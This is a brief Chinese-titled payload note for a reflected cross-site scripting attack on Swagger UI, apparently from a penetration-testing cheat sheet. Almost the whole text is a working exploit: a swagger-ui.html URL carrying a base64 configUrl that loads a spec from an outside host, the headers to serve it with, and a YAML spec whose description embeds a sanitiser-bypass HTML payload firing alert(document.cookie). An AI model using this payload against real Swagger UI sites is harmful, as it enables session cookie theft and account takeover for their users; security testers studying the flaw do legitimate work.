### swagger-ui 反射型xss

```txt
/swagger-ui.htmlconfigUrl=data:text/html;base64,ewoidXJsIjoiaHR0cHM6Ly9leHViZXJhbnQtaWNlLnN1cmdlLnNoL3Rlc3QueWFtbCIKfQ==
```

* header:

  Access-Control-Allow-Origin: *

  Content-Type: text/yaml; charset=UTF-8

```yaml
swagger: '2.0'
info:
  title: Example yaml.spec
  description: |
    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><textarea><a title="</textarea><img src='#' onerror='alert(document.cookie)'>">
paths:
  /accounts:
    get:
      responses:
        '200':
          description: No response was specified
      tags:
        - accounts
      operationId: findAccounts
      summary: Finds all accounts

```

